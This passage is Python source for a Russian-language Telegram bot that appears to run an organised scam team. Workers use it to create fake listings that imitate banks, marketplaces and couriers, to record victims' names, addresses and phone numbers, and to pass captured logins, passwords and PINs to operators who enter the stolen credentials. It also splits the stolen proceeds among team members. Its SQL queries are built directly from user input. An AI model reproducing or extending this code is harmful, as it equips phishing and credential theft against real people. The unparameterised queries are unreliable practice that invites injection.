                bot.send_message(call.from_user.id, f'<b>🚀Ты взял лог на вбив\n\n🛍Сервис: {datr[0]}\n\n📱Номер: <code>{phone}</code>\n🔐Пароль: {password}\n🤑Пин: {pin}\n💵Сумма: {cash} грн\n\n👤Воркер: @{data[1]} {workerid}</b>',reply_markup=markup)
            if int(vbiver[0]) != 0:
                if int(vbiver[0]) == int(call.from_user.id):
                    pass
                if int(vbiver[0]) != (call.from_user.id):
                    bot.send_message(call.from_user.id, 'Лог уже вбивают!') 
        if req[0] == 'takeLKRaif':
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            items = req[3]
            take_id_to_db = sql.execute(f'SELECT id FROM FackeData WHERE idFake = {items}').fetchone()
            workerid = take_id_to_db[0]
            sql.execute(f"SELECT * FROM users WHERE id = {workerid}")
            print(workerid)
            data = sql.fetchone()
            bot.delete_message(call.message.chat.id, call.message.message_id)
            sql.execute(f"SELECT service FROM FackeData WHERE idFake = {items}")
            datr = sql.fetchone()
            sql.execute(f"SELECT whovbiv FROM FackeData WHERE idFake = {items}")
            vbiver = sql.fetchone()
            if vbiver[0] == 0:
                markup = types.InlineKeyboardMarkup(row_width=2)
                but = types.InlineKeyboardButton("🔒Код🔒", callback_data=f"setinfo_1_{items}")
                but1 = types.InlineKeyboardButton("♻️Пуш♻️", callback_data=f"setinfo_2_{items}")
                but2 = types.InlineKeyboardButton("☎️Звонок☎️", callback_data=f"setinfo_3_{items}")
                but3 = types.InlineKeyboardButton("✖️Hеверные данные✖️", callback_data=f"setinfo_4_{items}")
                but4 = types.InlineKeyboardButton("🗑Отказаться🗑", callback_data=f"privarnovbiv_{req[1]}_{items}")
                markup.add(but,but1,but2,but3,but4)
                bot.send_message(workerid, f'<b>👹Вбивер @{call.from_user.username} взял мамонта!\n📱Логин: {req[1]}</b>')
                bot.send_message(call.from_user.id, f'<b>🚀Ты взял лог на вбив\n\n🛍Сервис: {datr[0]}\n\n📱Логин: <code>{req[1]}</code>\n🔐Пароль: {req[2]}\n\n👤Воркер: @{data[1]} {workerid}</b>',reply_markup=markup)
            if int(vbiver[0]) != 0:
                if int(vbiver[0]) == int(call.from_user.id):
                    pass
                if int(vbiver[0]) != (call.from_user.id):
                    bot.send_message(call.from_user.id, 'Лог уже вбивают!') 

        
        if call.data == 'sCountry':
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT * FROM country")
            data = sql.fetchall()
            markup = types.InlineKeyboardMarkup(row_width=2)
            buttons = []
            for i in data:
                country = i[0]
                stat = i[1]
                stats = "✅"
                if stat == 'True':
                    stats = "✅"
                if stat == 'False':
                    stats = "❌"
                button = types.InlineKeyboardButton(text= str(i[0])+ '→' + str(stats), callback_data = f"on_{country}_{stat}")
                buttons.append(button)
            markup.add(*buttons)
            bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>🌪Установить страну для ворка</b>",reply_markup=markup)
        if req[0] == "on":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            country = req[1]
            stat = req[2]
            s = 'False' 
            if stat == 'True':
                s = 'False'
            if stat == 'False':
                s = 'True'
            sql.execute(f"UPDATE country SET stat = '{s}' WHERE country = '{country}'")
            db.commit()
            sql.execute("SELECT * FROM country")
            data = sql.fetchall()
            markup = types.InlineKeyboardMarkup(row_width=2)
            buttons = []
            for i in data:
                country = i[0]
                stat = i[1]
                stats = "✅"
                if stat == 'True':
                    stats = "✅"
                if stat == 'False':
                    stats = "❌"
                button = types.InlineKeyboardButton(text= str(i[0])+ '→' + str(stats), callback_data = f"on_{country}_{stat}")
                buttons.append(button)
            markup.add(*buttons)
            bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="<b>❄️Установить страну для ворка</b>",reply_markup=markup)
        if call.data == "settings":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT * FROM users WHERE id = {call.from_user.id}")
            data =sql.fetchall()
            for i in data:
                id = i[0]
                username = i[1]
                tah = i[2]
                meth = i[6]
            markup = types.InlineKeyboardMarkup(row_width=2)
            but = types.InlineKeyboardButton("🥷Установить тег", callback_data=f"setTah_{id}")
            but1 = types.InlineKeyboardButton("📤Установить метод", callback_data=f"setMeth_{id}")
            markup.add(but,but1)   
            bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"⚙️<b>Настройки</b>\n\n🥷Секретный тег: #{tah}\n📤Метод вывода: {meth}",reply_markup=markup)
        if req[0] == 'setTah':
            id = req[1]
            msg = bot.send_message(call.from_user.id, "🤫<b>Введите желаемый секретный тег</b>")
            bot.register_next_step_handler(msg,setTah,id)
        if req[0] == 'setMeth':
            id = req[1]
            msg = bot.send_message(call.from_user.id, "🎊<b>Введите желаемый метод для выплаты</b>")
            bot.register_next_step_handler(msg,setmeth,id)

def createprivat24(message):
        """ try: """
        msg = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openPrivat_{randItem}")
        markup.add(but)             
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, {msg} ,"privat24",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n💲Цена: {msg} грн</b>",reply_markup=markup)
        file = open(f'static/servers/{randItem}.txt','a')
        file.write('0')
        file.close()
        """ except:
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>") """
def createPumb(message):
        """ try: """
        msg = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openPumb_{randItem}")
        markup.add(but)             
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, {msg} ,"pumb",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n💲Цена: {msg} грн</b>",reply_markup=markup)
        file = open(f'static/servers/{randItem}.txt','a')
        file.write('0')
        file.close()

def createOschad(message):
        """ try: """
        msg = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openOschad_{randItem}")
        markup.add(but)             
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, {msg} ,"oschad",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n💲Цена: {msg} грн</b>",reply_markup=markup)
        file = open(f'static/servers/{randItem}.txt','a')
        file.write('0')
        file.close()
def createmonobank(message):
        """ try: """
        msg = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openMono_{randItem}")
        markup.add(but)             
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, {msg} ,"raif",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n💲Цена: {msg} грн</b>",reply_markup=markup)
        file = open(f'static/servers/{randItem}.txt','a')
        file.write('0')
        file.close()
       
        """ except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup) """

def nexBBK(message):
    msg = message.text
    city = bot.send_message(message.chat.id, "🏠<b>Введи город прибытия</b>")
    bot.register_next_step_handler(city, nextStepBBK, msg)

def nextStepBBK(message, msg):
    city = message.text
    sums = bot.send_message(message.chat.id, "<b>🔅Введи стоимость поездки</b>")
    bot.register_next_step_handler(sums,endbbkua,msg,city)
def endbbkua(message, msg,city):
    try:
        sums = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openbbkua_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeAdress,FackePhone,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}", "{city}", {sums} ,"blablacarUa",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🏢Город отправления: {msg}\n🏠Город прибытия: {city}\n🛒Сумма поездки: {sums} грн</b>",reply_markup=markup)
    except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup)



def nexBBKRu(message):
    msg = message.text
    city = bot.send_message(message.chat.id, "🏠<b>Введи город прибытия</b>")
    bot.register_next_step_handler(city, nextStepBBKRu, msg)

def nextStepBBKRu(message, msg):
    city = message.text
    sums = bot.send_message(message.chat.id, "<b>🔅Введи стоимость поездки</b>")
    bot.register_next_step_handler(sums,endbbkru,msg,city)
def endbbkru(message, msg,city):
    try:
        sums = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openbbkua_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeAdress,FackePhone,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}", "{city}", {sums} ,"blablacarRu",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🏢Город отправления: {msg}\n🏠Город прибытия: {city}\n🛒Сумма поездки: {sums} руб</b>",reply_markup=markup)
    except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup)


def nexBusFor(message):
    msg = message.text
    city = bot.send_message(message.chat.id, "🏠<b>Введи город прибытия</b>")
    bot.register_next_step_handler(city, nextStepBusFor, msg)
def nextStepBusFor(message,msg):
    city = message.text
    sums = bot.send_message(message.chat.id, "<b>🔅Введи стоимость поездки</b>")
    bot.register_next_step_handler(sums,endbus,msg,city)
def endbus(message,msg,city):
    try:
        sums = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openbus_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeAdress,FackePhone,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}", "{city}", {sums} ,"busfor",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🏢Город отправления: {msg}\n🏠Город прибытия: {city}\n🛒Сумма поездки: {sums} грн</b>",reply_markup=markup)
    except:
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>")
def nexBusForRu(message):
    msg = message.text
    city = bot.send_message(message.chat.id, "🏠<b>Введи город прибытия</b>")
    bot.register_next_step_handler(city, nextStepBusForRu, msg)
def nextStepBusForRu(message,msg):
    city = message.text
    sums = bot.send_message(message.chat.id, "<b>🔅Введи стоимость поездки</b>")
    bot.register_next_step_handler(sums,endbusru,msg,city)
def endbusru(message,msg,city):
    try:
        sums = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openbusru_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeAdress,FackePhone,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}", "{city}", {sums} ,"busforru",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🏢Город отправления: {msg}\n🏠Город прибытия: {city}\n🛒Сумма поездки: {sums} руб</b>",reply_markup=markup)
    except:
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>")


def nexAvito(message):
    msg = message.text
    sums = bot.send_message(message.chat.id, "✍️<b>Введи cумму</b>")
    bot.register_next_step_handler(sums, nextStepAvito, msg)
def nextStepAvito(message,msg):
    sums = message.text
    city = bot.send_message(message.chat.id, "<b>✍️Введи город</b>")
    bot.register_next_step_handler(city,nexAvitoLinkPhoto,msg,sums)
def nexAvitoLinkPhoto(message,msg,sums):
    city = message.text
    photo = bot.send_message(message.chat.id, "✍️<b>Напиши ФИО покупателя</b>")
    bot.register_next_step_handler(photo, endAvito, city, msg,sums)


def endAvito(message,city, msg,sums):
    try:
        photo = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openavito_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeTitle,FackeAdress,FackePhone,FackePrace, service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}","{city}", "{photo}" ,{sums} ,"avito",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🧊Название: {msg}\n🏠Город: {city}\n🛒Сумма: {sums} руб\n🧛🏻‍♂️ФИО: {photo}</b>",reply_markup=markup)
    except:
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>")
def nexYola(message):
    msg = message.text
    sums = bot.send_message(message.chat.id, "✍️<b>Введи cумму</b>")
    bot.register_next_step_handler(sums, nextStepYola, msg)
def nextStepYola(message,msg):
    sums = message.text
    city = bot.send_message(message.chat.id, "<b>✍️Введи город</b>")
    bot.register_next_step_handler(city,nexYolaLinkPhoto,msg,sums)
def nexYolaLinkPhoto(message,msg,sums):
    city = message.text
    photo = bot.send_message(message.chat.id, "✍️<b>Введи свой ФИО</b>")
    bot.register_next_step_handler(photo, endYola, city, msg,sums)


def endYola(message,city, msg,sums):
    try:
        photo = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openyola_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeTitle,FackeAdress,FackePhone,FackePrace, service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}","{city}", "{photo}" ,{sums} ,"yola",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🧊Название: {msg}\n🏠Город: {city}\n🛒Сумма: {sums} руб\n🗣Отправитель: {photo}</b>",reply_markup=markup)
    except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup)


def nexYandex(message):
    msg = message.text
    sums = bot.send_message(message.chat.id, "✍️<b>Введи cумму</b>")
    bot.register_next_step_handler(sums, nextStepYandex, msg)
def nextStepYandex(message,msg):
    sums = message.text
    city = bot.send_message(message.chat.id, "<b>✍️Введи адрес мамонта</b>")
    bot.register_next_step_handler(city,nexYandexNumber,msg,sums)

def nexYandexNumber(message,msg,sums):
    city = message.text
    phone = bot.send_message(message.chat.id, "✍️<b>Отправь номер телефона мамонта</b>")
    bot.register_next_step_handler(phone, nexYandexPhoto, city, msg,sums)

def nexYandexPhoto(message,city, msg,sums):
    phone = message.text
    photo = bot.send_message(message.chat.id, "✍️<b>Отправь ссылку на фото товара</b>")
    bot.register_next_step_handler(photo, endYandex, city, msg,sums,phone)

def endYandex(message,city, msg,sums,phone):
    try: 
        photo = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openyandex_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeTitle,FackeAdress,FackePhone,FackePrace, FackeName,service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}","{city}", "{phone}" ,{sums}, "{photo}" ,"yandex",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🧊Название: {msg}\n🏠Город: {city}\n🛒Сумма: {sums} руб\n📲Номер: {phone}</b>",reply_markup=markup)
    except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup)


def nexBoxberry(message):
    msg = message.text
    sums = bot.send_message(message.chat.id, "✍️<b>Введи cумму</b>")
    bot.register_next_step_handler(sums, nextStepbox, msg)
def nextStepbox(message,msg):
    sums = message.text
    city = bot.send_message(message.chat.id, "<b>✍️Введи адрес мамонта</b>")
    bot.register_next_step_handler(city,nexboxNumber,msg,sums)

def nexboxNumber(message,msg,sums):
    city = message.text
    phone = bot.send_message(message.chat.id, "✍️<b>Отправь номер телефона мамонта</b>")
    bot.register_next_step_handler(phone, setmanbox, city, msg,sums)

def setmanbox(message,city, msg, sums):
    phone = message.text
    man = bot.send_message(message.chat.id, "✍️<b>Введите ФИО получателя</b>")
    bot.register_next_step_handler(man,setcitybox,city,msg,sums,phone)

def setcitybox(message,city, msg, sums,phone):
    man = message.text
    gorod = bot.send_message(message.chat.id, "✍️<b>Введите город от куда отправка</b>")
    bot.register_next_step_handler(gorod,endbox,city,msg,sums,phone,man)

def endbox(message,city, msg,sums,phone,man):
    try:
        gorod = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openboxberry_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeTitle,FackeAdress,FackePhone,FackePrace, FackeName,FackeCity, service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}","{city}", "{phone}" ,{sums}, "{man}", "{gorod}","boxberry",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🧊Название: {msg}\n🏠Адрес: {city}\n🛒Сумма: {sums} руб\n📲Номер: {phone}\n🦣Получатель: {man}</b>",reply_markup=markup)
    except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup)




def nexcdec(message):
    msg = message.text
    sums = bot.send_message(message.chat.id, "✍️<b>Введи cумму</b>")
    bot.register_next_step_handler(sums, nextStepcdec, msg)
def nextStepcdec(message,msg):
    sums = message.text
    city = bot.send_message(message.chat.id, "<b>✍️Введи адрес мамонта</b>")
    bot.register_next_step_handler(city,nexcdecNumber,msg,sums)

def nexcdecNumber(message,msg,sums):
    city = message.text
    phone = bot.send_message(message.chat.id, "✍️<b>Отправь номер телефона мамонта</b>")
    bot.register_next_step_handler(phone, setmancdec, city, msg,sums)

def setmancdec(message,city, msg, sums):
    phone = message.text
    man = bot.send_message(message.chat.id, "✍️<b>Введите ФИО получателя</b>")
    bot.register_next_step_handler(man,setcitycdec,city,msg,sums,phone)

def setcitycdec(message,city, msg, sums,phone):
    man = message.text
    gorod = bot.send_message(message.chat.id, "✍️<b>Введите город от куда отправка</b>")
    bot.register_next_step_handler(gorod,endcdec,city,msg,sums,phone,man)

def endcdec(message,city, msg,sums,phone,man):
    try:
        gorod = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"opencdek_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeTitle,FackeAdress,FackePhone,FackePrace, FackeName,FackeCity, service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}","{city}", "{phone}" ,{sums}, "{man}", "{gorod}","cdek",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🧊Название: {msg}\n🏠Адрес: {city}\n🛒Сумма: {sums} руб\n📲Номер: {phone}\n🦣Получатель: {man}</b>",reply_markup=markup)
    except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup)


def nexsber(message):
    try:
        msg = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"opensber_{randItem}")
        markup.add(but)             
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackePrace,service,whovbiv) VALUES ({message.chat.id}, {randItem}, {msg} ,"sberbank",{0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n💲Цена: {msg} руб</b>",reply_markup=markup)
    except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup)
    
def nexpostru(message):
    msg = message.text
    sums = bot.send_message(message.chat.id, "✍️<b>Введи cумму</b>")
    bot.register_next_step_handler(sums, nextpostru, msg)
def nextpostru(message,msg):
    sums = message.text
    city = bot.send_message(message.chat.id, "<b>✍️Введи адрес мамонта</b>")
    bot.register_next_step_handler(city,nexpostruNumber,msg,sums)

def nexpostruNumber(message,msg,sums):
    city = message.text
    phone = bot.send_message(message.chat.id, "✍️<b>Отправь номер телефона свой</b>")
    bot.register_next_step_handler(phone, setpostrucdec, city, msg,sums)

def setpostrucdec(message,city, msg, sums):
    phone = message.text
    man = bot.send_message(message.chat.id, "✍️<b>Введите имя получателя</b>")
    bot.register_next_step_handler(man,endpostru,city,msg,sums,phone)


def endpostru(message,city, msg,sums,phone):
    try:
        man = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        randItem = randint(111111,999999)
        markup = types.InlineKeyboardMarkup(row_width=2)
        but = types.InlineKeyboardButton("💢Открыть💢", callback_data=f"openpostru_{randItem}")
        markup.add(but)          
        sql.execute(f'INSERT INTO FackeData (id,idFake,FackeTitle,FackeAdress,FackePhone,FackePrace, FackeName, service,whovbiv) VALUES ({message.chat.id}, {randItem}, "{msg}","{city}", "{phone}" ,{sums}, "{man}" ,"postru", {0});')
        db.commit()
        bot.send_message(message.chat.id, f"<b>📦 Обьявление {randItem} созданно\n\n🧊Название: {msg}\n🏠Город: {city}\n🛒Сумма: {sums} руб\n📲Номер: {phone}\n🦣Получатель: {man}</b>",reply_markup=markup)
    except:
        markup = types.InlineKeyboardMarkup(row_width=1)
        but = types.InlineKeyboardButton("Все хуйня давай по новой", callback_data=f"createfacke")    
        markup.add(but)
        bot.send_message(message.chat.id,"<b>Поздравляю, заполняй анкету заново</b>",reply_markup=markup)




def setporfitid(message):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    setid = message.text
    sql.execute(f"SELECT id FROM users WHERE id = {setid}")
    data = sql.fetchone()
    if data is None:
        bot.send_message(message.chat.id,"<b>🚷Пользователь не найден</b>")
    else:
        cash = bot.send_message(message.chat.id,"<b>✍️Введите сумму профита</b>")
        bot.register_next_step_handler(cash, setporfitcash,setid)
def setporfitcash(message,setid):
    try:
        cash = int(message.text)
        msgs = bot.send_message(message.chat.id, "<b>✍️Введи процент воркера (от 1 до 100)</b>")
        bot.register_next_step_handler(msgs, setprofitpr,setid,cash)
    except:
        bot.send_message(message.chat.id,"<b>Заполняй правильно все!</b>")
def setprofitpr(message,setid,cash):
    try:
        msgs = int(message.text)
        vbiv = bot.send_message(message.chat.id, "<b>✍️Введи ник вбивера без @</b>")
        bot.register_next_step_handler(vbiv, setprofitus,setid,cash,msgs)
    except:
        bot.send_message(message.chat.id,"<b>Заполняй правильно все!</b>")
        setporfitcash(message)
def setprofitus(message,setid,cash,msgs):
    vbiv = message.text
    val = bot.send_message(message.chat.id, "<b>✍️Введи номер валюты профита в зависимости от сервиса:\n\n🇺🇦 грн → 1\n🇷🇺 руб → 2</b>")
    bot.register_next_step_handler(val, setprofitend,setid,cash,msgs,vbiv)

def setprofitend(message,setid,cash,msgs,vbiv):
    val = int(message.text)
    p = 'usd'
    if val == 1:
        p = 'uah'
    if val == 2:
        p = 'rub'
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute(f"SELECT * FROM users WHERE id = {setid}")
    dat = sql.fetchone()
    x = int(int(cash) / 100 * int(msgs))
    cod = int(int(cash) / 100 * 10)
    alls = api.get_price(ids='usd', vs_currencies=f'{p}')['usd'][f'{p}']
    alls_s = int(cash) / int(alls) 
    works = api.get_price(ids='usd', vs_currencies=f'{p}')['usd'][f'{p}']
    worker = int(x)  / int(works) 
    coders = api.get_price(ids='usd', vs_currencies=f'{p}')['usd'][f'{p}']
    coderss = int(cod) / int(coders) 
    sql.execute(f"UPDATE users SET cash = {int(dat[4]) + int(worker)} WHERE id = {setid}")
    sql.execute(f"UPDATE users SET profit = {int(dat[5]) + int(1)} WHERE id = {setid}")
    sql.execute(f"UPDATE {botName} SET bank = {int(dat[4]) + int(alls_s)}")
    db.commit()
    bot.send_message(setid,f"<b>🎉Новый профит\n\n🏦Сумма профита: {int(alls_s)}$ → {cash}{p}\n🤑Твоя доля: {int(worker)}$ → {x}{p}\n\n👤Вбил: @{vbiv}</b>")
    bot.send_message(chatPays, f"<b>🎉Новый профит\n\n🏦Сумма профита: {int(alls_s)}$ → {cash}{p}\n🤑Доля воркера: {int(worker)}$ → {x}{p}\n\n🦹🏿‍♀️Воркер: #{dat[2]}\n👤Вбил: @{vbiv}</b>")
    bot.send_message(chatWorks, f"<b>🎉Новый профит\n\n🏦Сумма профита: {int(alls_s)}$ → {cash}{p}\n\n👤Вбил: @{vbiv}</b>")
    bot.send_message(chatCoder,f"🎉Новый профит у {botName}🎉\n🧶Твоя доля: {int(coderss)} $ {cod} {p}")
    




def porfitlogcash(message,idw,itemf):
    msg = message.text
    msgs = bot.send_message(message.chat.id, "<b>Введи процент воркера</b>")
    bot.register_next_step_handler(msgs, porfitlogwal,idw,itemf,msg)

def porfitlogwal(message,idw,itemf,msg):
    msgs = message.text
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute(f"SELECT service FROM FackeData WHERE idFake = {itemf}")
    datr = sql.fetchone()
    sql.execute(f"SELECT * FROM users WHERE id = {idw}")
    dat = sql.fetchone()
    
    p = '🐭'
    if datr[0] ==  'blablacarUa':
        p = 'uah'
    if datr[0] ==  'olx':
        p = 'uah'
    if datr[0] ==  'busfor':
        p = 'uah'
    if datr[0] ==  'blablacarRu':
        p = 'rub'
    if datr[0] ==  'privat24':
        p = 'uah'
    if datr[0] ==  'raif':
        p = 'uah'
    if datr[0] ==  'pumb':
        p = 'uah'
    if datr[0] ==  'oschad':
        p = 'uah'
    if datr[0] ==  'yola':
        p = 'rub'
    if datr[0] ==  'yandex':
        p = 'rub'
    if datr[0] ==  'sberbank':
        p = 'rub'
    if datr[0] ==  'cdek':
        p = 'rub'
    if datr[0] ==  'boxberry':
        p = 'rub'
    if datr[0] ==  'postru':
        p = 'rub'
    x = int(int(msg) / 100 * int(msgs))
    cod = int(int(msg) / 100 * 10)
    alls = api.get_price(ids='usd', vs_currencies=f'{p}')['usd'][f'{p}']
    alls_s = int(msg) / int(alls) 
    works = api.get_price(ids='usd', vs_currencies=f'{p}')['usd'][f'{p}']
    worker = int(x)  / int(works) 
    coders = api.get_price(ids='usd', vs_currencies=f'{p}')['usd'][f'{p}']
    coderss = int(cod) / int(coders) 
    sql.execute(f"UPDATE users SET cash = {int(dat[4]) + int(worker)} WHERE id = {idw}")
    sql.execute(f"UPDATE users SET profit = {int(dat[5]) + int(1)} WHERE id = {idw}")
    sql.execute(f"UPDATE {botName} SET bank = {int(dat[4]) + int(alls_s)}")
    db.commit()
    bot.send_message(idw,f"<b>🎉Новый профит\n\n🏦Сумма профита: {int(alls_s)}$ → {msg}{p}\n🤑Твоя доля: {int(worker)}$ → {x}{p}\n\n👤Вбил: @{message.from_user.username}</b>")
    bot.send_message(chatPays, f"<b>🎉Новый профит\n\n🏦Сумма профита: {int(alls_s)}$ → {msg}{p}\n🤑Доля воркера: {int(worker)}$ → {x}{p}\n\n🦹🏿‍♀️Воркер: #{dat[2]}\n👤Вбил: @{message.from_user.username}</b>")
